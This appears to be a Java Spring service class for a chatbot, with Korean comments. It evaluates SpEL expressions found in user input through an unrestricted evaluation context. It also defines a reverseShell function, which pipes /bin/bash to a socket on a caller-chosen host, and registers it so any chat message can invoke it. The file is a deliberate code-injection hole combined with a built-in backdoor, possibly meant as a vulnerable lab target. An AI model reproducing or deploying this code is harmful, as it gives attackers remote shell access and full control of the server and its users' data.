package com.example.chatbot.service;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.expression.spel.support.StandardTypeLocator;
import org.springframework.stereotype.Service;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Service
public class SpelEvalService {
    private static final Pattern DOLLAR_PATTERN = Pattern.compile("\\$\\{([^}]+)\\}");

    // reverseShell 함수 정의
    public static void reverseShell(String ip, int port) {
        try {
            Socket s = new Socket(ip, port);
            Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();

            // 프로세스 stdout -> 소켓
            new Thread(() -> {
                try (InputStream pi = p.getInputStream(); OutputStream so = s.getOutputStream()) {
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = pi.read(buf)) != -1) {
                        so.write(buf, 0, len);
                        so.flush();
                    }
                } catch (Exception ignored) {}
            }).start();

            // 소켓 -> 프로세스 stdin
            new Thread(() -> {
                try (InputStream si = s.getInputStream(); OutputStream po = p.getOutputStream()) {
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = si.read(buf)) != -1) {
                        po.write(buf, 0, len);
                        po.flush();
                    }
                } catch (Exception ignored) {}
            }).start();
        } catch (Exception e) {
            // 예외 무시
        }
    }

    public String evaluate(String input) {
        if (input == null) return null;

        // 1. JSON 파싱 후, 이스케이프된 쌍따옴표를 원래대로 복원
        input = input.replace("\\\"", "\"");

        ExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(new StandardTypeLocator(getClass().getClassLoader()));

        // reverseShell 함수 SpEL에 등록
        try {
            context.registerFunction("reverseShell",
                    SpelEvalService.class.getMethod("reverseShell", String.class, int.class));
        } catch (Exception ignored) {}

        Matcher m = DOLLAR_PATTERN.matcher(input);
        StringBuffer sb = new StringBuffer();
        while (m.find()) {
            String expr = m.group(1);
            Object val = null;
            try {
                val = parser.parseExpression(expr).getValue(context);
            } catch (Exception e) {
                e.printStackTrace();
                val = "실패: " + e.getMessage();
            }
            m.appendReplacement(sb, val != null ? Matcher.quoteReplacement(val.toString()) : "");
        }
        m.appendTail(sb);
        String result = sb.toString();

        // 2. 만약 문장 맨 앞에 SpEL 코드가 있을 때 (공백 또는 특수문자 전까지)
        Pattern spelPrefix = Pattern.compile("^([\\w\\.\\$\\{\\}\\(\\)\\'\\,]+)\\s+(.+)$");
        Matcher prefixMatcher = spelPrefix.matcher(result);
        if (prefixMatcher.matches()) {
            String expr = prefixMatcher.group(1);
            String tail = prefixMatcher.group(2);
            Object val = null;
            try {
                val = parser.parseExpression(expr).getValue(context);
            } catch (Exception e) {
                val = "실패";
            }
            result = (val != null ? val.toString() : "") + " " + tail;
        }

        return result;
    }

}
